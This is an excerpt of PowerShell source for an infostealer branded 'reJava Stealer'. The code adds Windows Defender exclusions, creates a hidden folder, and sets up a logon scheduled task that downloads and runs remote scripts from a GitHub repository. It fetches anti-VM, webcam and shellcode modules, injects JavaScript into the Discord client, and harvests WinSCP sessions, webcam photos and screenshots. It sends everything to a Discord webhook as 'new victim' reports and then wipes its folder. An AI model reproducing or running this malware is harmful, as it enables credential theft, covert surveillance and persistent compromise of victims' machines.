...
$avatar = "https://imgur.com/gallery/rejava-SkArr40"
...
function Invoke-TASKS {
    ...
    if ($persistence) {
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
        Add-MpPreference -ExclusionPath "$env:APPDATA\reJava" -Force
        $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\reJava" -Force
        $KDOT_DIR.Attributes = "Hidden", "System"
        $task_name = "reJava"
        $task_action = if ($debug) {
            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/autorun.ps1 | iex`""
        } else {
            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/autorun.ps1')|iex`",0)(window.close)"
        }
        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "reJava" -RunLevel Highest -Force | Out-Null
        Write-Host "[!] Persistence Added" -ForegroundColor Green
    }
    if ($blockhostsfile) {
        $link = "https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/blockhosts.ps1"
...
function VMPROTECT {
    $link = ("https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/antivm.ps1")
...
function Backup-Data {
    ...
    $folderformat = "$env:APPDATA\reJava\$countrycode-($hostname)-($filedate)-($timezoneString)"
    ...
    $prefixedGuid = "reJava-Stealer-" + $suffix
   ...
   Get-WinSCPSessions
    ...
    $webcam = ("https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/webcam.ps1")
            ...
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                ...
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        ...
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/injection.js")
                        if ($content -ne "") {
    ...
    $kematian_shellcode = ("https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/kematian_shellcode.ps1")
    ...
    $embed_and_body = @{
        ...
        "url"         = "https://discord.gg/ZUpq5DDK2p"
        "embeds"      = @(
            @{
                "title"       = "reJava Stealer"
                "url"         = "https://discord.gg/ZUpq5DDK2p"
                "description" = "New victim info collected !"
                "color"       = "00000000"
                "footer"      = @{
                    "text" = "Made by reJava team | SelfJect solo"
                }
                "thumbnail"   = @{
                    "url" = "https://imgur.com/gallery/rejava-SkArr40"
                }
                "fields"      = @(
                    @{
                    ...
                    @{
                        "name"  = ":file_folder: reJava File Info"
    ...
    $items = Get-ChildItem -Path "$env:APPDATA\reJava" -Filter out*.jpg
    ...
    foreach ($jpegfile in $jpegfiles) {
        $name = $jpegfile.Name
        $messageContent = @{content = "## :camera: Webcam" ; username = "reJava" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
    ...
    # Send screenshot
    $messageContent = @{content = "## :desktop: Screenshot"; username = "reJava" ; avatar_url = $avatar } | ConvertTo-Json
    ...
    $messageContent = @{username = "reJava" ; avatar_url = $avatar } | ConvertTo-Json
    ...
    Remove-Item "$env:appdata\reJava" -Force -Recurse
}
